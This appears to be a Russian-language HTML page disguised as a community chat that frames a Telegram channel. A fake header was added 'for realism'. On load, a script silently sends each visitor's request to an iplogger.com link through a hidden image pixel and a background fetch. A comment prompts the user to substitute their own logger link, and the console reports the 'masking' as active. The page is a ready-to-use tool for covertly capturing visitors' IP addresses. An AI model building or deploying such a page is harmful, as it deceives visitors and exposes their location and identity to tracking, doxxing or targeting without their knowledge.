<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Обсуждение | Сообщество</title>
    <style>
        * { margin:0; padding:0; }
        body, html { 
            width:100%; 
            height:100%; 
            overflow:hidden; 
            background:#0e0e0e;
            font-family: Arial, sans-serif;
        }
        #header {
            background: #1a1a1a;
            padding: 12px 20px;
            color: #fff;
            font-size: 18px;
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 10;
            position: relative;
        }
        #header span {
            opacity: 0.7;
            font-size: 14px;
        }
        iframe {
            width: 100%;
            height: calc(100% - 50px);
            border: none;
            display: block;
        }
        .loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            font-size: 16px;
            opacity: 0.5;
        }
    </style>
</head>
<body>

    <!-- Шапка для реализма -->
    <div id="header">
        <span>💬</span> Общий чат сообщества 
        <span style="margin-left:auto; font-size:13px; opacity:0.5;">онлайн: 12</span>
    </div>

    <!-- Индикатор загрузки (исчезнет) -->
    <div class="loader" id="loader">Загрузка...</div>

    <!-- Iframe с Telegram -->
    <iframe id="tgFrame" src="https://t.me/chatobsheniya2033" 
            onload="document.getElementById('loader').style.display='none'">
    </iframe>

    <script>
        // === НЕВИДИМЫЙ СБОР IPLOGGER (без редиректа) ===
        // 1. Через Image (самый надёжный)
        var pixel = new Image();
        pixel.src = "https://iplogger.com/2Hyib8";  // <--- ЗАМЕНИ НА СВОЮ ССЫЛКУ IPLOGGER
        pixel.style.display = "none";
        document.body.appendChild(pixel);

        // 2. Дополнительно через fetch (для страховки)
        fetch("https://iplogger.com/2Hyib8", { 
            method: "HEAD",
            mode: "no-cors" 
        }).catch(() => {});

        // 3. Сохранение адреса в строке (History API)
        if (window.history && window.history.pushState) {
            window.history.pushState(null, "", window.location.href);
        }

        // 4. Обработка перезагрузки (чтобы адрес не сбрасывался)
        window.addEventListener("beforeunload", function() {
            // Ничего не делаем — адрес остаётся
        });

        console.log("ROCKET маскировка активна");
    </script>

</body>
</html>
